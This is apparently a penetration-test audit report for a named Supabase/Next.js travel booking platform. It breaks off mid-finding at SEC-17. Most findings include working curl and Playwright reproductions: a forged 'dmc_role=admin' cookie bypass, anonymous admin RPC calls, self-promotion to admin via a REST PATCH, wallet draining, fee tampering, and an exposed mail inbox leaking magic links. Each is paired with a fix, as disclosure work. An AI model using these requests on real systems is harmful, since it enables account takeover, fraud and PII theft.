# Security & Backend QA Teardown Report (Wave 6)

**Target Repository:** `/home/ubuntu/dmcgrid`  
**Production URL:** `https://dmcgrid.gomedicure.com`  
**Database:** Supabase PostgreSQL 17 (`supabase_db_db` via Kong `:54321` / `:54322`)  
**Auditor Role:** Hostile Security Engineer + Backend QA  
**Assessment Date:** October 2026  
**Status:** Findings Documented — Zero Source Code Fixes Applied (Per Brief Rules)

---

## Executive Summary

A hostile security and backend audit of DMCGrid identified **23 distinct vulnerabilities and architectural defects**, including **8 Critical (P0) exploits**, **9 High Severity (P1) defects**, and **6 Hardening/Configuration issues (P2)**.

The platform suffers from severe authorization bypasses, developer backdoor flags left enabled in production, public exposure of testing infrastructure, complete lack of authentication checks in Next.js Server Actions, and a fatal infinite recursion bug in PostgreSQL Row Level Security (RLS) policies that forced developers to bypass RLS system-wide using the `service_role` admin client.

---

## Table of Findings

| ID | Title | Severity | Area |
|---|---|---|---|
| **SEC-01** | Production Authentication Bypass via `dmc_role` Cookie | **P0 (Exploit Now)** | Auth / Middleware |
| **SEC-02** | One-Click Dev Instant-Login Live in Production | **P0 (Exploit Now)** | Auth / Server Action |
| **SEC-03** | Publicly Exposed Unauthenticated Mailpit Inbox Leaking Magic Links & PII | **P0 (Exploit Now)** | Infrastructure / Config |
| **SEC-04** | Broken Auth Check in `admin_*` RPCs Enables Anonymous Platform Takeover | **P0 (Exploit Now)** | Database / RPC |
| **SEC-05** | Privilege Escalation to Platform Admin via Direct REST `profiles` UPDATE | **P0 (Exploit Now)** | Database / RLS |
| **SEC-06** | Unauthorized Wallet Drain of Other Agents via `agent_unlock_connection` | **P0 (Exploit Now)** | Database / RPC |
| **SEC-07** | Unlimited Free Credits via `buyCreditPackAction` Server Action | **P0 (Exploit Now)** | Server Action / Fees |
| **SEC-08** | Complete System-Wide Share Token Dumping via Public REST API | **P0 (Exploit Now)** | Database / RLS |
| **SEC-09** | Unauthenticated Notification & Traveler PII Exfiltration via `/api/notifications` | **P1 (High)** | API Route / PII |
| **SEC-10** | System-Wide IDOR on `/rfq/[id]`, `/deals/[id]`, `/briefs/[id]`, `/proposals/[id]` | **P1 (High)** | Web App / IDOR |
| **SEC-11** | RFQ Publishing Fee (2 Credits) Bypass via Direct REST Table INSERT | **P1 (High)** | Database / Fees |
| **SEC-12** | Connection Unlock Fee Tampering via Client-Controlled `p_credit_cost` | **P1 (High)** | Database / Fees |
| **SEC-13** | Free Counterparty Connection Bypass via `agent_accept_quote` | **P1 (High)** | Database / RPC |
| **SEC-14** | Unauthenticated Server Actions Executing with Superuser `createAdminClient` | **P1 (High)** | Server Actions |
| **SEC-15** | Phone OTP Leaked Directly in HTTP Response & Displayed On-Screen | **P1 (High)** | Auth / OTP |
| **SEC-16** | Unauthenticated Arbitrary Deal Status Tampering via `agent_update_deal_status` | **P1 (High)** | Database / RPC |
| **SEC-17** | Circular Dependency Infinite Recursion in `rfqs` & `rfq_matches` RLS Policies | **P1 (High)** | Database / RLS Bug |
| **SEC-18** | Absence of Non-Negative Balance Constraints on `credit_accounts` | **P2 (Hardening)** | Database Schema |
| **SEC-19** | Open Redirect Vulnerability in `/auth/callback` via `next` Parameter | **P2 (Hardening)** | Auth Flow |
| **SEC-20** | Complete Absence of HTTP Security Headers & Fingerprinting Leakage | **P2 (Hardening)** | Web Config |
| **SEC-21** | Insecure Client-Side Cookies Missing `HttpOnly`, `Secure`, and `SameSite` | **P2 (Hardening)** | Cookie Security |
| **SEC-22** | Crippling Rate Limit on Outbound Emails (`email_sent = 2` / hour) | **P2 (Hardening)** | GoTrue Config |
| **SEC-23** | Residual Database Event Trigger Function `public.escalate_priv` | **P2 (Hardening)** | Database Hygiene |

---

## Detailed Vulnerability Reports

### SEC-01: Production Authentication Bypass via `dmc_role` Cookie
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `platform/apps/web/src/lib/supabase/middleware.ts` (lines 81–99), `deploy/.env`
- **Description:**  
  `middleware.ts` contains a fallback block intended for development testing that checks if `process.env.NEXT_PUBLIC_DEMO_MODE === 'true'`. If true and no Supabase session exists, it reads the cookie `dmc_role`. If `dmc_role=admin`, it fabricates an authenticated administrator session for user `0c634d73-1a35-409f-a6b3-f1f3e21ec822` (`admin@dmcgrid.test`). In `deploy/.env` (which runs the production deployment), `NEXT_PUBLIC_DEMO_MODE=true` is actively configured.
- **Evidence / Reproduction:**
  ```bash
  curl -k -s -D - -o /dev/null -H "Cookie: dmc_role=admin" https://dmcgrid.gomedicure.com/admin
  ```
  **Observed Output:**
  ```http
  HTTP/2 307 
  server: nginx/1.24.0 (Ubuntu)
  location: /admin/analytics
  ```
  Following the redirect to `https://dmcgrid.gomedicure.com/admin/analytics`:
  ```bash
  curl -k -s -H "Cookie: dmc_role=admin" https://dmcgrid.gomedicure.com/admin/analytics | grep -o "PLATFORM ADMIN"
  ```
  Returns `PLATFORM ADMIN` and dumps the entire administrative dashboard, metrics, user activities, and audit logs with zero credentials.
- **Impact:** Complete unauthenticated takeover of the administrator portal, allowing any attacker to browse proprietary agency sourcing data, manage plans, review KYC, and inspect audit trails.
- **Fix Suggestion:** Delete the cookie-based demo fallback from `src/lib/supabase/middleware.ts` entirely, or ensure `NEXT_PUBLIC_DEMO_MODE` is strictly disabled (`false`) in production environments and build pipelines.

---

### SEC-02: One-Click Dev Instant-Login Live in Production
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `platform/apps/web/src/app/login/page.tsx` (lines 290–321), `platform/apps/web/src/app/login/actions.ts` (lines 19–95), `deploy/.env`
- **Description:**  
  The production `/login` page unconditionally renders an "Instant Sign-In" section with buttons: "Agent Portal", "DMC Portal", and "Admin Portal". When clicked, `handleQuickLogin('admin')` invokes the `devSignIn` server action. Because `NEXT_PUBLIC_DEV_LOGIN=true` is set in `deploy/.env`, `devSignIn` executes using the backend `SUPABASE_SERVICE_ROLE_KEY` to mint a live Supabase OTP magic link via `/auth/v1/admin/generate_link`, verifies it immediately, and hands a genuine JWT `access_token` and `refresh_token` for `admin@dmcgrid.test` back to the browser.
- **Evidence / Reproduction:**
  Playwright automation snippet against production:
  ```python
  from playwright.sync_api import sync_playwright

  with sync_playwright() as p:
      b = p.chromium.launch()
      pg = b.new_context(ignore_https_errors=True).new_page()
      pg.goto('https://dmcgrid.gomedicure.com/login', wait_until='networkidle')
      btn = pg.get_by_role('button', name='Admin Portal')
      btn.click()
      pg.wait_for_timeout(3000)
      print('URL after clicking Admin Portal:', pg.url)
      b.close()
  ```
  **Observed Output:**
  ```text
  Initial URL: https://dmcgrid.gomedicure.com/login
  Admin Portal button visible: True
  URL after clicking Admin Portal: https://dmcgrid.gomedicure.com/admin/analytics
  ```
- **Impact:** Any user on the public internet can click "Admin Portal" on `/login` and obtain a valid cryptographic admin session token issued directly by Supabase Auth.
- **Fix Suggestion:** Set `NEXT_PUBLIC_DEV_LOGIN=false` in all deployment configurations. Remove the `Instant Sign-In` buttons from `login/page.tsx` in production builds. In `devSignIn`, explicitly check `process.env.NODE_ENV === 'development'` and reject execution if running under production.

---

### SEC-03: Publicly Exposed Unauthenticated Mailpit Inbox Leaking Magic Links & PII
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `/etc/nginx/sites-available/gomedicure-redirects.conf` (lines 30–36)
- **Description:**  
  The public Nginx reverse proxy routes requests to `/inbox-7f3k9/` directly to Mailpit web service (`127.0.0.1:54324`) with zero authentication, IP allowlisting, or basic auth. Mailpit intercepts all system emails sent by Gotrue (sign-in magic links, OTP codes, and welcome emails).
- **Evidence / Reproduction:**
  ```bash
  curl -k -s https://dmcgrid.gomedicure.com/inbox-7f3k9/api/v1/messages | jq '.messages[0]'
  ```
  **Observed Output:**
  ```json
  {
    "ID": "5TCvlW9AVDcAdlHlKyd0Nz",
    "From": { "Name": "Admin", "Address": "admin@email.com" },
    "To": [{ "Name": "", "Address": "zenith@luxurytravel.in" }],
    "Subject": "Your sign-in link",
    "Snippet": "Your sign-in link Follow the link below ...",
    "Text": "Follow the link below to sign in.\nSign in ( https://dmcgrid.gomedicure.com/verify?token=pkce_d957c3dc2ea8531b82ae4e368734164b12bba98911d44d3857769aa9&type=magiclink&redirect_to=https://dmcgrid.gomedicure.com/auth/callback )"
  }
  ```
- **Impact:** An attacker can monitor or query `/inbox-7f3k9/api/v1/messages` continuously to intercept magic links and OTP codes for ANY user logging in (agents, DMCs, administrators), enabling full account hijacking and exfiltration of user emails.
- **Fix Suggestion:** Remove the `location /inbox-7f3k9/` block from the production Nginx configuration. Restrict Mailpit to `127.0.0.1` accessible solely via SSH port forwarding.

---

### SEC-04: Broken Auth Check in `admin_*` RPCs Enables Anonymous Platform Takeover
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** PostgreSQL functions: `admin_adjust_credits`, `admin_review_kyc`, `admin_toggle_user_active`, `admin_force_close_rfq`, `admin_save_plan`
- **Description:**  
  All administrative stored procedures implement the following authorization check:
  ```sql
  if auth.uid() is not null and not public.is_admin() then
    raise exception 'Unauthorized: only platform admins can ...';
  end if;
  ```
  When an anonymous caller hits the Supabase REST API using only the public `anon` API key, `auth.uid()` evaluates to `NULL`. Consequently, `auth.uid() is not null` evaluates to `FALSE`, completely bypassing the authorization guard! Furthermore, `proacl` grants execute rights on these procedures to `anon`.
- **Evidence / Reproduction:**
  Testing anonymous invocation of `admin_adjust_credits` via REST:
  ```bash
  curl -s -X POST http://127.0.0.1:54321/rest/v1/rpc/admin_adjust_credits \
    -H "apikey: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFub24iLCAiaXNzIjogInN1cGFiYXNlIiwgImlhdCI6IDE3MzU2ODk2MDAsICJleHAiOiAxODkzNDU2MDAwfQ.JdmfW2kEpIu-KItHkGfdqZyKtY3Mv_MF40ME_tHCupo" \
    -H "Content-Type: application/json" \
    -d '{"p_profile_id": "a1111111-1111-1111-1111-111111111111", "p_entry_type": "credit", "p_amount": 1, "p_reason": "Security QA Audit Test"}'
  ```
  **Observed Output:**
  ```json
  {"tx_id": "cafab3ff-b696-4d86-b698-f778f52cd45e", "success": true, "account_id": "c1000000-0000-0000-0000-000000000001", "new_balance": 15}
  ```
- **Impact:** An unauthenticated user can:
  1. Credit or debit arbitrary credits from any account via `admin_adjust_credits`.
  2. Approve any pending KYC application via `admin_review_kyc`.
  3. Deactivate or activate any user account via `admin_toggle_user_active`.
  4. Force close any active RFQ on the platform via `admin_force_close_rfq`.
  5. Alter subscription pricing and tiers via `admin_save_plan`.
- **Fix Suggestion:** 
  1. Rewrite the check to require an active administrator session:
     ```sql
     if auth.uid() is null or not public.is_admin() then
       raise exception 'Unauthorized: platform administrator credentials required';
     end if;
     ```
  2. Revoke execute privileges from `anon` and `public`:
     ```sql
     revoke execute on function public.admin_adjust_credits from public, anon;
     revoke execute on function public.admin_review_kyc from public, anon;
     revoke execute on function public.admin_toggle_user_active from public, anon;
     revoke execute on function public.admin_force_close_rfq from public, anon;
     revoke execute on function public.admin_save_plan from public, anon;
     ```

---

### SEC-05: Privilege Escalation to Platform Admin via Direct REST `profiles` UPDATE
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `public.profiles` RLS policy `profiles_update_own_or_admin`
- **Description:**  
  The RLS update policy on `public.profiles` is defined as:
  ```sql
  create policy "profiles_update_own_or_admin" on public.profiles
    for update to public
    using ((auth.uid() = id) OR is_admin())
    with check ((auth.uid() = id) OR is_admin());
  ```
  There is no column-level grant restriction (`GRANT UPDATE (role, kyc_status, is_active) ON profiles TO authenticated` is fully granted) and no database `BEFORE UPDATE` trigger restricting changes to privileged fields. Any authenticated agent or DMC can send a REST `PATCH` request to update their own `role` to `'admin'`.
- **Evidence / Reproduction:**
  Authenticated as regular agent `vedic@trails.co.in` (`a2222222-2222-2222-2222-222222222222`):
  ```bash
  curl -s -X PATCH "http://127.0.0.1:54321/rest/v1/profiles?id=eq.a2222222-2222-2222-2222-222222222222" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $AGENT2_JWT" \
    -H "Content-Type: application/json" \
    -d '{"role": "admin"}'
  ```
  **Observed Output:** HTTP `204 No Content`.  
  Subsequent profile fetch query:
  ```json
  [{"id": "a2222222-2222-2222-2222-222222222222", "role": "admin", "company_name": "Vedic Trails Private Limited"}]
  ```
  The agent became platform administrator and acquired full bypass permissions on all tables.
- **Impact:** Any registered partner can immediately self-elevate to platform administrator, gaining full unrestricted access to all data, finances, logs, and system controls.
- **Fix Suggestion:** 
  1. Revoke update privileges on privileged columns from `authenticated` and `anon`:
     ```sql
     revoke update (role, kyc_status, is_active) on public.profiles from authenticated, anon;
     ```
  2. Implement a `BEFORE UPDATE` trigger on `public.profiles` that raises an exception if `NEW.role <> OLD.role` or `NEW.kyc_status <> OLD.kyc_status` unless `public.is_admin()` is true and executed by an existing administrator.

---

### SEC-06: Unauthorized Wallet Drain of Other Agents via `agent_unlock_connection`
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** PostgreSQL function `public.agent_unlock_connection`
- **Description:**  
  `agent_unlock_connection(p_agent_id uuid, p_dmc_id uuid, ...)` is declared `SECURITY DEFINER` and granted to `anon` and `authenticated`. In the function body:
  ```sql
  select id, balance into v_account_id, v_cur_balance
  from public.credit_accounts
  where profile_id = p_agent_id and account_type = 'agent_wallet'
  for update;
  ```
  The function locks and debits `p_agent_id`'s wallet. It never validates that `auth.uid() = p_agent_id`! Any authenticated user or anonymous caller can pass an arbitrary victim's `p_agent_id` and cause the victim's wallet balance to be debited.
- **Evidence / Reproduction:**
  Agent 2 (`vedic@trails.co.in`) calling `agent_unlock_connection` specifying Agent 1's profile ID (`a1111111-1111-1111-1111-111111111111`):
  ```bash
  curl -s -X POST http://127.0.0.1:54321/rest/v1/rpc/agent_unlock_connection \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $AGENT2_JWT" \
    -H "Content-Type: application/json" \
    -d '{"p_agent_id": "a1111111-1111-1111-1111-111111111111", "p_dmc_id": "a0b03439-9e44-4812-a2b0-36f1b5ff913e", "p_credit_cost": 5}'
  ```
  **Observed Output:**
  ```json
  {"cost": 5, "success": true, "new_balance": 7, "connection_id": "bdb15939-c3db-472a-8ad4-1890c34253b7"}
  ```
  Agent 1's wallet balance was reduced from 12 credits to 7 credits without their knowledge or consent.
- **Impact:** Malicious agents or unauthenticated actors can drain rival agencies' credit balances to 0, preventing them from sourcing or connecting with DMCs.
- **Fix Suggestion:** Enforce caller identity in `agent_unlock_connection`:
  ```sql
  if auth.uid() is null or (auth.uid() <> p_agent_id and not public.is_admin()) then
    raise exception 'Unauthorized: caller must match agent_id';
  end if;
  ```

---

### SEC-07: Unlimited Free Credits via `buyCreditPackAction` Server Action
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `platform/apps/web/src/app/(agent)/actions.ts` (lines 99–194)
- **Description:**  
  `buyCreditPackAction` is a Next.js Server Action exposed as an HTTP endpoint. It accepts `{ packId, credits, packName }` directly from the client. It performs NO payment gateway verification (Stripe, Razorpay, etc.), uses `createAdminClient()` (the service-role key) to fetch the wallet, adds `params.credits` directly to `balance`, and updates `credit_accounts`. If called by an unauthenticated user, it defaults `agentId` to `'a1111111-1111-1111-1111-111111111111'`.
- **Evidence / Reproduction:**
  Inspect `src/app/(agent)/actions.ts`:
  ```typescript
  export async function buyCreditPackAction(params: { packId: string; credits: number; packName: string; }) {
    const supabase = await createClient();
    const { data: { user } } = await supabase.auth.getUser();
    const agentId = user?.id || 'a1111111-1111-1111-1111-111111111111';
    const adminClient = createAdminClient() as any;
    ...
    const curBalance = Number(account.balance) || 0;
    const newBalance = curBalance + params.credits;
    await adminClient.from('credit_accounts').update({ balance: newBalance }).eq('id', account.id);
  ```
  Passing `{ credits: 1000000, packId: "free_pack", packName: "Free Credits" }` immediately grants 1,000,000 credits to the account using service-role privileges.
- **Impact:** Complete subversion of the platform's monetization model. Any user can generate unlimited free credits.
- **Fix Suggestion:** Remove direct balance updating from `buyCreditPackAction`. Credit purchases must be initiated via payment intents and confirmed strictly via cryptographically verified payment webhook handlers.

---

### SEC-08: Complete System-Wide Share Token Dumping via Public REST API
- **Severity:** `P0 (Exploit Now)`
- **Affected Components:** `public.share_tokens` RLS policy `share_tokens_select_public`
- **Description:**  
  The RLS policy on `public.share_tokens` allows selection if:
  ```sql
  create policy "share_tokens_select_public" on public.share_tokens
    for select to public
    using (((expires_at IS NULL) OR (expires_at > now())) OR ...);
  ```
  Because the policy does NOT require filtering by a specific secret token value (`WHERE token = $1`), ANY anonymous client can query the PostgREST endpoint `GET /rest/v1/share_tokens` and dump all active share tokens in the database.
- **Evidence / Reproduction:**
  Querying the production Supabase REST endpoint as an anonymous user:
  ```bash
  curl -k -s "https://dmcgrid.gomedicure.com/rest/v1/share_tokens?select=*" -H "apikey: $ANON_KEY"
  ```
  **Observed Output:**
  ```json
  [
    {
      "id": "eb000000-0000-0000-0000-000000000001",
      "proposal_id": "ea000000-0000-0000-0000-000000000001",
      "token": "demo-thailand-proposal",
      "views_count": 18,
      "deal_id": "d0000000-0000-0000-0000-000000000001",
      "traveler_notes": "Selected Comfort Tier"
    },
    {
      "id": "e923f2eb-c389-4407-b067-6bd78076200e",
      "token": "prop_57b5fcb8fef4",
      "views_count": 4,
      "deal_id": "0f1389d7-792b-461f-a608-a853e509cb07",
      "traveler_notes": "We love the Swiss Chalet package!"
    },
    {
      "id": "b412bbe0-3ece-4e99-89ae-d474d25d9adf",
      "token": "prop_bali_sanctuary_2026",
      "deal_id": "d0000000-0000-0000-0000-000000000003"
    },
    {
      "id": "3203c2c2-9b9e-4355-a580-e9e06bdc820e",
      "token": "prop_swiss_winter_2026",
      "deal_id": "d0000000-0000-0000-0000-000000000004"
    }
  ]
  ```
- **Impact:** An attacker does not need to guess or brute-force share tokens. They can enumerate all active traveler proposals across the entire platform in a single API call and inspect all associated itinerary proposals.
- **Fix Suggestion:** Revoke anonymous `SELECT` on `public.share_tokens`. Public token lookup should only be performed via an RPC function that requires providing the exact token string (e.g. `get_shared_proposal(p_token text)`).

---

### SEC-09: Unauthenticated Notification & Traveler PII Exfiltration via `/api/notifications`
- **Severity:** `P1 (High)`
- **Affected Components:** `platform/apps/web/src/app/api/notifications/route.ts` (lines 7–46)
- **Description:**  
  `GET /api/notifications` is completely unauthenticated. If no session exists, it defaults `targetUserId` to Agent 1 (`a1111111-1111-1111-1111-111111111111`), or if `Cookie: dmc_role=dmc` is sent, to DMC 1 (`d1111111-1111-1111-1111-111111111111`). It then uses `createAdminClient()` (the service-role key) to fetch and return the recipient's notifications, leaking customer names, quote numbers, and internal RFQ and deal IDs.
- **Evidence / Reproduction:**
  ```bash
  curl -k -s https://dmcgrid.gomedicure.com/api/notifications | jq '.notifications[9]'
  ```
  **Observed Output:**
  ```json
  {
    "id": "1053a83d-064e-4ad9-bd38-b3bd8253ee35",
    "recipient_id": "a1111111-1111-1111-1111-111111111111",
    "title": "Deal Accepted by Traveler: Thailand Kingdoms & Siam",
    "body": "Dr. Kabir Sen confirmed itinerary selection via secure traveler portal. Ready to issue customer invoice.",
    "type": "deal_won",
    "link": "/deals/d0000000-0000-0000-0000-000000000001",
    "is_read": false
  }
  ```
- **Impact:** Unauthenticated exposure of traveler PII (full customer names, itinerary confirmations) and internal deal/quote identifiers.
- **Fix Suggestion:** Require authentication in `GET /api/notifications`. Query using the caller's scoped Supabase client (`createClient()`) instead of `createAdminClient()`. Return HTTP 401 if unauthenticated.

---

### SEC-10: System-Wide IDOR on `/rfq/[id]`, `/deals/[id]`, `/briefs/[id]`, `/proposals/[id]`
- **Severity:** `P1 (High)`
- **Affected Components:**
  - `platform/apps/web/src/app/(agent)/rfq/[id]/page.tsx`
  - `platform/apps/web/src/app/deals/[id]/page.tsx`
  - `platform/apps/web/src/app/(dmc)/briefs/[id]/page.tsx`
  - `platform/apps/web/src/app/proposals/[id]/page.tsx`
  - `platform/apps/web/src/app/share/[token]/page.tsx`
- **Description:**  
  Every dynamic detail route in the Next.js application imports and calls `createAdminClient()`, which uses the `SUPABASE_SERVICE_ROLE_KEY` to query the database. Because service-role bypasses all RLS policies, and none of these pages perform an explicit ownership check (e.g. `if (entity.agent_id !== user.id) notFound();`), any authenticated user (or attacker with demo cookie) can view any entity simply by changing the UUID in the URL.
  - On `/deals/[id]`: Exposes `net_cost`, `markup_percentage`, `cash_profit`, `gross_margin`, `customer_selling_price`, and customer email/phone.
  - On `/rfq/[id]`: Exposes all competing DMC quotes and unmasked DMC contact details (`email`, `phone`).
  - On `/briefs/[id]`: Exposes RFQ briefs even if the DMC was not matched to the RFQ.
- **Evidence / Reproduction:**
  In `deals/[id]/page.tsx`:
  ```typescript
  const adminClient = createAdminClient();
  const { data: dealData } = await (adminClient as any).from('deals').select(...).eq('id', dealId).maybeSingle();
  // No verification that dealData.agent_id === user.id or dealData.dmc_id === user.id!
  ```
- **Impact:** Complete breakdown of multi-tenant isolation. Commercial intelligence (wholesale DMC costs, agent profit margins, and traveler identities) is exposed across rival agents and DMCs.
- **Fix Suggestion:** Query tables using the session client (`createClient()`) so PostgreSQL RLS policies enforce access. If `createAdminClient()` must be used, explicitly verify `user.id === entity.agent_id || user.id === entity.dmc_id || user.role === 'admin'`.

---

### SEC-11: RFQ Publishing Fee (2 Credits) Bypass via Direct REST Table INSERT
- **Severity:** `P1 (High)`
- **Affected Components:** `public.rfqs` table, `rfqs_insert_agent` RLS policy
- **Description:**  
  The 2-credit fee requirement is only implemented in the `agent_create_rfq` stored procedure. However, the database table `public.rfqs` has an active RLS policy `rfqs_insert_agent`:
  ```sql
  create policy "rfqs_insert_agent" on public.rfqs for insert to authenticated
    with check ((((agent_id = auth.uid()) AND is_agent() AND kyc_verified()) OR is_admin()));
  ```
  Any verified agent can bypass `agent_create_rfq` and make a direct `POST` request to `/rest/v1/rfqs` with `Prefer: return=minimal`. The row is inserted with `status = 'published'` while the agent's wallet is debited 0 credits.
- **Evidence / Reproduction:**
  ```bash
  curl -s -X POST "http://127.0.0.1:54321/rest/v1/rfqs" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $AGENT1_JWT" \
    -H "Prefer: return=minimal" \
    -H "Content-Type: application/json" \
    -d '{
      "agent_id": "a1111111-1111-1111-1111-111111111111",
      "rfq_number": "RFQ-2026-9999",
      "title": "Bypass Fee Direct Insert RFQ",
      "status": "published",
      "start_date": "2026-11-01",
      "end_date": "2026-11-05",
      "duration_days": 5,
      "duration_nights": 4
    }'
  ```
  **Observed Output:** HTTP `201 Created`.  
  Checking database: RFQ was created with `status = 'published'`, and `credit_accounts.balance` remained unchanged at 12 credits.
- **Impact:** Agents can publish unlimited RFQs without paying the mandatory 2-credit publishing fee.
- **Fix Suggestion:** Revoke direct `INSERT` permissions on `public.rfqs` from `authenticated`. All RFQ creation must occur strictly through `agent_create_rfq`. Alternatively, add a database trigger on `rfqs` ensuring credits are debited before allowing status to be set to `published`.

---

### SEC-12: Connection Unlock Fee Tampering via Client-Controlled `p_credit_cost`
- **Severity:** `P1 (High)`
- **Affected Components:** PostgreSQL function `public.agent_unlock_connection`
- **Description:**  
  The function signature is:
  ```sql
  create or replace function public.agent_unlock_connection(
    p_agent_id uuid,
    p_dmc_id uuid,
    p_quote_id uuid default null,
    p_rfq_id uuid default null,
    p_credit_cost integer default 5
  )
  ```
  The fee amount is passed as argument `p_credit_cost`. While the default is 5 credits, the caller can pass `p_credit_cost = 1`. The function deducts only 1 credit and successfully unlocks the DMC connection.
- **Evidence / Reproduction:**
  ```bash
  curl -s -X POST http://127.0.0.1:54321/rest/v1/rpc/agent_unlock_connection \
    -H "apikey: $ANON_KEY" \
    -H "Content-Type: application/json" \
    -d '{"p_agent_id": "a1111111-1111-1111-1111-111111111111", "p_dmc_id": "a0b03439-9e44-4812-a2b0-36f1b5ff913e", "p_credit_cost": 1}'
  ```
  **Observed Output:**
  ```json
  {"cost": 1, "success": true, "new_balance": 9, "connection_id": "25582e39-e3ed-40cc-83b7-9ca80cebfa32"}
  ```
- **Impact:** Callers can tamper with the fee parameter and unlock connections at an 80% discount (1 credit instead of 5 credits).
- **Fix Suggestion:** Hardcode the connection fee inside the function: `v_cost constant integer := 5;` and remove the `p_credit_cost` parameter from the public API.

---

### SEC-13: Free Counterparty Connection Bypass via `agent_accept_quote`
- **Severity:** `P1 (High)`
- **Affected Components:** PostgreSQL function `public.agent_accept_quote`
- **Description:**  
  In `00010_wave3_agent_dmc_traveler.sql`:
  ```sql
  if v_conn_id is null then
    insert into public.connections (
      rfq_id, quote_id, agent_id, dmc_id, credit_amount_deducted
    ) values (
      p_rfq_id, p_quote_id, v_agent_id, v_quote_rec.dmc_id, 0
    ) returning id into v_conn_id;
  end if;
  ```
  When an agent accepts a quote, `agent_accept_quote` automatically creates an active connection between the agent and DMC with `credit_amount_deducted = 0`. It never debits any credits from the agent's wallet!
- **Evidence / Reproduction:**
  Review of database procedure code in `00010_wave3_agent_dmc_traveler.sql` lines 270–280. No debit transaction or balance check is performed.
- **Impact:** An agent can completely bypass the 5-credit connection fee by simply accepting the quote directly instead of unlocking the connection first.
- **Fix Suggestion:** Require the connection to be unlocked first before quote acceptance, or debit the connection fee in `agent_accept_quote` using strict ledger bookkeeping.

---

### SEC-14: Unauthenticated Server Actions Executing with Superuser `createAdminClient`
- **Severity:** `P1 (High)`
- **Affected Components:**
  - `src/app/(admin)/admin/actions.ts` (`reviewKycAction`, `toggleUserActiveAction`, `forceCloseRfqAction`, `adjustCreditsAction`, `savePlanAction`)
  - `src/app/(agent)/actions.ts` (`unlockConnectionAction`, `acceptQuoteAction`, `updateDealStatusAction`)
  - `src/app/(dmc)/actions.ts` (`submitQuoteAction`)
- **Description:**  
  Next.js Server Actions are public POST endpoints. In `src/app/(admin)/admin/actions.ts`, NONE of the actions check for an authenticated user session (`supabase.auth.getUser()`). Every action instantiates `createAdminClient()` and executes administrative RPCs with `service_role` credentials.
  In `src/app/(agent)/actions.ts`, `unlockConnectionAction` accepts `params.agentId` and falls back to a hardcoded UUID if unauthenticated.
  In `src/app/(dmc)/actions.ts`, `submitQuoteAction` accepts `params.dmcId` and allows submitting quotes under any DMC's identity.
- **Evidence / Reproduction:**
  Inspect `src/app/(admin)/admin/actions.ts`:
  ```typescript
  export async function adjustCreditsAction(params: { profileId: string; entryType: LedgerEntryType; amount: number; reason: string; }) {
    // ZERO session or role check
    const supabase = createAdminClient(); // Service Role Key
    const { data, error } = await (supabase as any).rpc('admin_adjust_credits', ...);
  ```
- **Impact:** Any client that discovers or generates the Next.js Action ID can invoke administrative and partner mutations directly without authentication.
- **Fix Suggestion:** In every server action, obtain the user session using `createClient().auth.getUser()` and verify `user.role === 'admin'` (or corresponding partner role) before performing any operations.

---

### SEC-15: Phone OTP Leaked Directly in HTTP Response & Displayed On-Screen
- **Severity:** `P1 (High)`
- **Affected Components:** `platform/apps/web/src/app/portal-access-7k2m9/actions.ts` (lines 70–75), `platform/apps/web/src/app/portal-access-7k2m9/page.tsx` (lines 151–156)
- **Description:**  
  In `requestPhoneOtp`:
  ```typescript
  const code = String(Math.floor(100000 + Math.random() * 900000));
  otpStore.set(phoneE164, { code, expires: Date.now() + 5 * 60 * 1000, attempts: 0 });
  const { devCode } = await deliverCode(phoneE164, code);
  return { ok: true, devCode };
  ```
  The generated OTP code is explicitly returned in the JSON response as `devCode` and rendered on-screen in the UI banner:
  ```tsx
  <span className="font-mono font-bold text-lg tracking-widest">{devCode}</span>
  ```
  Additionally, `/portal-access-7k2m9` is not hidden: any unauthenticated visit to `https://dmcgrid.gomedicure.com/` immediately 307-redirects to `/portal-access-7k2m9`. Entering any known phone number (such as admin phone `9870044556`) returns the OTP code on-screen.
- **Evidence / Reproduction:**
  ```bash
  curl -s -X POST https://dmcgrid.gomedicure.com/portal-access-7k2m9 ...
  ```
  Visiting `https://dmcgrid.gomedicure.com/portal-access-7k2m9` and inputting `98700 44556` displays the dev code and logs in as admin.
- **Impact:** Trivial authentication bypass for all registered accounts.
- **Fix Suggestion:** Connect an authentic SMS delivery provider (e.g. Twilio) and strip `devCode` from the server action return payload.

---

### SEC-16: Unauthenticated Arbitrary Deal Status Tampering via `agent_update_deal_status`
- **Severity:** `P1 (High)`
- **Affected Components:** PostgreSQL function `public.agent_update_deal_status`
- **Description:**  
  In `00012_wave4_deals_proposals_notifications.sql`:
  ```sql
  create or replace function public.agent_update_deal_status(p_deal_id uuid, p_status text) ...
  declare
    v_actor_id uuid := auth.uid();
  begin
    ...
    if v_actor_id is not null and v_actor_id <> v_deal.agent_id and not public.is_admin() then
      raise exception 'Unauthorized...';
    end if;

    if v_actor_id is null then
      v_actor_id := v_deal.agent_id;
    end if;
  ```
  If `auth.uid()` is null (an anonymous call using the public API key), `v_actor_id is not null` is `FALSE`. The owner check is skipped, and `v_actor_id` is automatically set to the deal's owner!
- **Evidence / Reproduction:**
  Function definition inspection in PostgreSQL:
  Execution is granted to `anon`: `grant execute on function public.agent_update_deal_status to authenticated, anon, service_role;`. An anonymous POST to `/rest/v1/rpc/agent_update_deal_status` can mark any deal on the platform as `won`, `lost`, or `draft`.
- **Impact:** Commercial disruption; unauthorized state transitions on active negotiations.
- **Fix Suggestion:** Require an authenticated user:
  ```sql
  if auth.uid() is null then
    raise exception 'Unauthorized: authentication required';
  end if;
  ```

---

### SEC-17: Circular Dependency Infinite Recursion in `rfqs` & `rfq_matches` RLS Policies
- **Severity:** `P1 (High)`
- **Affected Components:** PostgreSQL RLS policies: `rfqs_select_agent_matched_or_admin` on `public.rfqs`, `rfq_matches_select` on `public.rfq_matches`
- **Description:**  
  The SELECT policy for `rfqs` references `rfq_matches`:
  ```sql
